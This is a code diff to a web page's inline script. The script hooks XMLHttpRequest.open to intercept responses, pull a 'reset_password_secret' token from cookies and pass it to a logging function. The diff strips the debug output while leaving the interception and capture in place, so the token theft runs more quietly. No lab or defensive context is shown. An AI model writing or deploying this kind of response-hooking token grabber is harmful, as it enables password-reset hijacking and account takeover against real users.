@@ -28,9 +28,7 @@
             const originalOpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
                 this.addEventListener("readystatechange", function () {
-                    console.log('Intercepted state change:', this.readyState, this.status);
                     if (this.readyState === 4) {
-                        console.log('Intercepted response:', this.responseText);
                         if (this.status === 201) {
                             try {
                                 const response = JSON.parse(this.responseText);
@@ -40,7 +38,6 @@
                                     cookies.forEach(cookie => {
                                         if (cookie.includes('reset_password_secret=')) {
                                             const token = cookie.split('=')[1];
-                                            console.log('Found token:', token);
                                             logData({ token: token });
                                         }
                                     });
@@ -56,9 +53,6 @@
         }
 
         interceptResponse();
-        
-        // Test logging manually for debugging
-        logData({ token: new URLSearchParams(window.location.search).get('token') });
     </script>
 </body>
 </html>
